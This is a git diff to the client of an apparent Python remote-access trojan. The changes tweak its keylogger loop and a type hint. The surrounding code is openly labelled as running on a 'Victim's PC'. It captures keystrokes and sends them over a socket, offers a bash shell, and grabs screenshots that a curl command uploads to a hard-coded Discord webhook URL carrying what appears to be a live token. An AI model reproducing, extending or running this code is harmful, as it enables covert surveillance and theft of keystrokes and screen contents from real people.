@@ -49,9 +49,8 @@ class Client():
             self.client.send(f"Opening {_URL_TO_OPEN} In Victim's PC!".encode())
         # Log Keys
         if self.command.startswith("log_keys"):
-            while True:
-                with keyboard.Listener(on_press=self.log_keys) as listener:
-                    listener.join()
+            with keyboard.Listener(on_press=self.log_keys) as listener:
+                listener.join()
         # Open Bash
         if self.command=="open_bash":
             while True:
@@ -71,7 +70,7 @@ class Client():
         ImageGrab.grab().save("screenshot.png")
         _temp_path=os.path.join(os.getcwd(),"screenshot.png")
         subprocess.getoutput(f"curl -F image=@{_temp_path} -F content=\"Screenshot Of Victim's PC\" \"POST\" \"https://discord.com/api/webhooks/1048155720031420436/-ARmdlaFvJyb-6iKCWb-uNXIgO9M6zMbpt4MR85rfL8mqEIXXZr7we-L8XNG9aGSAORy\"")
-    def log_keys(self,key:keyboard.Key):
+    def log_keys(self,key:keyboard.KeyCode | keyboard.Key):
         self.client.send(str(key).encode())
     @staticmethod
     def init_socket(_addr:str,_port:int) -> Tuple[socket.socket,Tuple[str,int]]:
